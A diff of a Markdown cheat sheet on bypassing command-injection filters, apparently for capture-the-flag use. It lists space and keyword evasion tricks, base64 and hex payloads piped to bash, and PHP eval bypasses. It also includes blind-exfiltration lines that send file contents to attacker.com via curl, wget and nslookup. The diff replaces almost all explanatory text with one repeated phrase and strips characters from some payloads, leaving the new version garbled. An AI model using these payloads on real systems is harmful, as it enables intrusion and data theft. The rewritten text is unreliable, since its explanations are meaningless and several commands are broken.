@@ -1,142 +1,142 @@
-# 命令注入绕过技巧大全
+# remote command execution testing guidance
 
-## 空格绕过
+## remote command execution testing guidance
 
-| 方法 | 示例 | 说明 |
+| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
 |------|------|------|
-| `${IFS}` | `cat${IFS}flag.php` | 内部字段分隔符（默认空格/Tab/换行） |
-| `$IFS$9` | `cat$IFS$9flag.php` | `$9` 是当前 shell 第 9 个位置参数（空），防止变量名歧义 |
-| `${IFS}` + 变量 | `a=$IFS;cat${a}flag` | 赋值后引用 |
-| `<` | `cat<flag.php` | 重定向代替空格 |
-| `%09` | `cat%09flag.php` | Tab 的 URL 编码 |
-| `%0a` | `cat%0aflag.php` | 换行符 |
-| `{cat,flag.php}` | `{cat,flag.php}` | Bash 大括号展开（仅 Bash） |
-| `%0d` | `cat%0dflag.php` | 回车符 |
+| `${IFS}` | `cat${IFS}flag.php` | remote command execution testing guidance（remote command execution testing guidance/Tab/remote command execution testing guidance） |
+| `$IFS$9` | `cat$IFS$9flag.php` | `$9` remote command execution testing guidance shell remote command execution testing guidance 9 remote command execution testing guidance（remote command execution testing guidance），remote command execution testing guidance |
+| `${IFS}` + remote command execution testing guidance | `a=$IFS;cat${a}flag` | remote command execution testing guidance |
+| `<` | `cat<flag.php` | remote command execution testing guidance |
+| `%09` | `cat%09flag.php` | Tab remote command execution testing guidance URL remote command execution testing guidance |
+| `%0a` | `cat%0aflag.php` | remote command execution testing guidance |
+| `{cat,flag.php}` | `{cat,flag.php}` | Bash remote command execution testing guidance（remote command execution testing guidance Bash） |
+| `%0d` | `cat%0dflag.php` | remote command execution testing guidance |
 
-### 空格绕过选择策略
-1. **首选** `$IFS$9` — 兼容性最好
-2. **备选** `<` — 简洁，但 `<` 在某些上下文可能被过滤
-3. **URL 场景** 用 `%09` 或 `%0a`
+### remote command execution testing guidance
+1. **remote command execution testing guidance** `$IFS$9` — remote command execution testing guidance
+2. **remote command execution testing guidance** `<` — remote command execution testing guidance，remote command execution testing guidance `<` remote command execution testing guidance
+3. **URL remote command execution testing guidance** remote command execution testing guidance `%09` remote command execution testing guidance `%0a`
 
-## 命令分隔符
+## remote command execution testing guidance
 
-| 分隔符 | 示例 | 说明 |
+| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
 |--------|------|------|
-| `;` | `id;cat flag` | 顺序执行 |
-| `&&` | `id && cat flag` | 前成功才执行后 |
-| `\|\|` | `id \|\| cat flag` | 前失败才执行后 |
-| `\|` | `id \| cat flag` | 管道 |
-| `%0a` | `id%0acat flag` | 换行执行 |
+| `;` | `id;cat flag` | remote command execution testing guidance |
+| `&&` | `id && cat flag` | remote command execution testing guidance |
+| `\|\|` | `id \|\| cat flag` | remote command execution testing guidance |
+| `\|` | `id \| cat flag` | remote command execution testing guidance |
+| `%0a` | `id%0acat flag` | remote command execution testing guidance |
 | `%0d%0a` | `id%0d%0acat flag` | CRLF |
 
-## 命令/关键字绕过
+## remote command execution testing guidance/remote command execution testing guidance
 
-### 字符串拼接
+### remote command execution testing guidance
 ```bash
-c'a't flag.php       # 单引号拼接
-c"a"t flag.php       # 双引号拼接
-c\at flag.php        # 反斜杠转义
+c'a't flag.php       # remote command execution testing guidance
+c"a"t flag.php       # remote command execution testing guidance
+c\at flag.php        # remote command execution testing guidance
 ```
 
-### 变量拼接
+### remote command execution testing guidance
 ```bash
 a=c;b=at;$a$b flag.php
 a=fl;b=ag;cat /$a$b
 ```
 
-### 通配符
+### remote command execution testing guidance
 ```bash
-cat /f???.php        # ? 匹配单字符
-cat /f*              # * 匹配任意字符
-/bin/ca? /etc/pas?d  # 路径中也可用
-cat /f[a-z]ag.php    # 字符类
+cat /f   .php        #   remote command execution testing guidance
+cat /f*              # * remote command execution testing guidance
+/bin/ca  /etc/pas d  # remote command execution testing guidance
+cat /f[a-z]ag.php    # remote command execution testing guidance
 ```
 
-### base64 编码
+### base64 remote command execution testing guidance
 ```bash
 echo Y2F0IGZsYWcucGhw | base64 -d | bash
 # Y2F0IGZsYWcucGhw = "cat flag.php"
 ```
 
-### hex 编码
+### hex remote command execution testing guidance
 ```bash
 echo 63617420666c61672e706870 | xxd -r -p | bash
 # 63617420666c61672e706870 = "cat flag.php"
 ```
 
-### 使用未禁的替代命令
+### remote command execution testing guidance
 
-| 目标 | 原命令 | 替代命令 |
+| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
 |------|--------|---------|
-| 读文件 | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
-| 读文件 | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
-| 查找文件 | find | ls -la / dir / echo / locate |
-| 下载 | wget | curl / nc / python -c 'import urllib...' |
-| 写文件 | echo > | tee / printf / python -c |
+| remote command execution testing guidance | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
+| remote command execution testing guidance | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
+| remote command execution testing guidance | find | ls -la / dir / echo / locate |
+| remote command execution testing guidance | wget | curl / nc / python -c 'import urllib...' |
+| remote command execution testing guidance | echo > | tee / printf / python -c |
 
-## 无回显利用（Blind RCE）
+## remote command execution testing guidance（Blind RCE）
 
-当命令执行结果不可见时：
+remote command execution testing guidance：
 
-### 1. DNS 外带
+### 1. DNS remote command execution testing guidance
 ```bash
 curl http://attacker.com/$(cat flag.php | base64)
 nslookup $(cat flag.php).attacker.com
 ```
 
-### 2. HTTP 外带
+### 2. HTTP remote command execution testing guidance
 ```bash
-curl http://attacker.com/?data=$(cat flag.php | base64)
-wget http://attacker.com/?data=$(cat flag.php | base64)
+curl http://attacker.com/ data=$(cat flag.php | base64)
+wget http://attacker.com/ data=$(cat flag.php | base64)
 ```
 
-### 3. 写文件到可访问路径
+### 3. remote command execution testing guidance
 ```bash
 cat flag.php > /var/www/html/flag.txt
-# 然后浏览器访问 http://target/flag.txt
+# remote command execution testing guidance http://target/flag.txt
 ```
 
-### 4. 写入环境变量/临时文件
+### 4. remote command execution testing guidance/remote command execution testing guidance
 ```bash
 cp flag.php /tmp/flag
-# 再通过另一个漏洞读取 /tmp/flag
+# remote command execution testing guidance /tmp/flag
 ```
 
-### 5. 时间盲注
+### 5. remote command execution testing guidance
 ```bash
 if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
-# 逐字符爆破
+# remote command execution testing guidance
 ```
 
-## PHP eval 特殊绕过
+## PHP eval remote command execution testing guidance
 
-### 空格过滤在 eval 场景
+### remote command execution testing guidance eval remote command execution testing guidance
 
 ```php
-// 当 eval($cmd) 且 $cmd 中的空格被过滤
-system("cat<flag.php");      // 重定向
+// remote command execution testing guidance eval($cmd) remote command execution testing guidance $cmd remote command execution testing guidance
+system("cat<flag.php");      // remote command execution testing guidance
 system("cat${IFS}flag.php"); // IFS
-system("cat$IFS$9flag.php"); // IFS + 位置参数
+system("cat$IFS$9flag.php"); // IFS + remote command execution testing guidance
 ```
 
-### 长度限制绕过
+### remote command execution testing guidance
 
 ```php
-// 当参数长度有限制（如 strlen > 18）
-// 利用 PHP 变量展开
-?a=system&b=cat flag.php
+// remote command execution testing guidance（remote command execution testing guidance strlen > 18）
+// remote command execution testing guidance PHP remote command execution testing guidance
+ a=system&b=cat flag.php
 // eval($_GET[a]($_GET[b]));
 ```
 
-### flag 关键字被替换
+### flag remote command execution testing guidance
 
 ```php
-// 当 "flag" 被替换为空格
-// 使用通配符
-cat /f*          # * 匹配 flag
-cat /fl?g.php    # ? 匹配单个字符
-cat /fla?.php
-// 使用路径拼接
-cat /fl''ag.php  # 空字符串拼接
-cat /fl\ag.php   # 反斜杠（可能被解释为转义）
+// remote command execution testing guidance "flag" remote command execution testing guidance
+// remote command execution testing guidance
+cat /f*          # * remote command execution testing guidance flag
+cat /fl g.php    #   remote command execution testing guidance
+cat /fla .php
+// remote command execution testing guidance
+cat /fl''ag.php  # remote command execution testing guidance
+cat /fl\ag.php   # remote command execution testing guidance（remote command execution testing guidance）
 ```
